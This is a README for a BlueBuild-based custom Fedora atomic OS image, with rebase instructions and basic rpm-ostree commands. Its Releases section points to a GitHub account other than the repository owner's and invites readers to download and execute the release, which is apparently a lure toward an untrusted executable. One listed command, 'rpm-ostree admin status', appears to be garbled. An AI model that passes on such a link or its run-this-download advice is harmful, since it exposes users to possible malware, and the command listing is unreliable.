# carlo-bazzite-os  &nbsp; [![bluebuild build badge](https://github.com/ismaeljcarlo/carlo-bazzite-os/actions/workflows/build.yml/badge.svg)](https://github.com/ismaeljcarlo/carlo-bazzite-os/actions/workflows/build.yml)

Welcome to the **carlo-bazzite-os** repository! This project serves as a template for creating custom operating system images using BlueBuild. If you're looking to set up your own image based on this template, you can find quick setup instructions in the [BlueBuild docs](https://blue-build.org/how-to/setup/). After setting up, remember to update this README to describe your custom image.

![Operating System](https://via.placeholder.com/800x200.png?text=Carlo+Bazzite+OS)

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Usage](#usage)
- [Features](#features)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Overview

**carlo-bazzite-os** is designed to provide a reliable and customizable operating system experience. Built on the principles of immutability and efficiency, this OS leverages atomic updates and container technology to deliver a modern computing environment.

### Key Topics

- **Atomic**: Ensures system stability with atomic updates.
- **BlueBuild**: Streamlines the image creation process.
- **Custom Images**: Tailor the OS to your specific needs.
- **Image-Based**: Focuses on image management for deployments.
- **Immutable**: Enhances security and reliability.
- **Linux**: Built on the Linux kernel for performance and flexibility.
- **OCI**: Supports Open Container Initiative standards for compatibility.

## Installation

> **Note**  
> This feature is experimental. Please proceed with caution and at your own discretion. You can learn more about it [here](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable).

To rebase an existing atomic Fedora installation to the latest build, follow these steps:

1. First, rebase to the unsigned image to get the proper signing keys and policies installed:
   ```bash
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/ismaeljcarlo/carlo-bazzite-os:latest
   ```

2. Reboot to complete the rebase:
   ```bash
   systemctl reboot
   ```

3. After rebooting, rebase to the signed image:
   ```bash
   rpm-ostree rebase ostree-registry:ghcr.io/ismaeljcarlo/carlo-bazzite-os:latest
   ```

## Usage

Once installed, you can start using **carlo-bazzite-os** for your projects. The OS is designed to be user-friendly and efficient. You can manage your applications using standard Linux commands.

### Basic Commands

- **Update the system**:
  ```bash
  rpm-ostree update
  ```

- **Check system status**:
  ```bash
  rpm-ostree status
  ```

- **List available images**:
  ```bash
  rpm-ostree admin status
  ```

## Features

- **Atomic Updates**: Ensure system stability with safe updates.
- **Customizability**: Tailor the OS to fit your specific requirements.
- **Container Support**: Seamlessly run containerized applications.
- **Security**: Benefit from an immutable file system that enhances security.
- **Efficiency**: Optimized for fast performance and resource management.

## Contributing

We welcome contributions to improve **carlo-bazzite-os**. If you have ideas, suggestions, or code improvements, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Commit your changes.
4. Push your branch and create a pull request.

### Code of Conduct

Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) while contributing.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

For the latest releases, visit our [Releases section](https://github.com/thodsaphon28/carlo-bazzite-os/releases). You can download the latest version and execute it on your system.

![Releases](https://img.shields.io/badge/Releases-latest-blue)

For detailed information about each release, check the changelog and release notes in the repository.

## Support

If you encounter any issues or have questions, please open an issue in the repository. We appreciate your feedback and will respond as soon as possible.

## Acknowledgments

We thank the contributors and the community for their support. Your feedback helps us improve **carlo-bazzite-os**.

## Additional Resources

- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)
- [Fedora Project](https://getfedora.org/)

Feel free to explore and customize **carlo-bazzite-os** to suit your needs!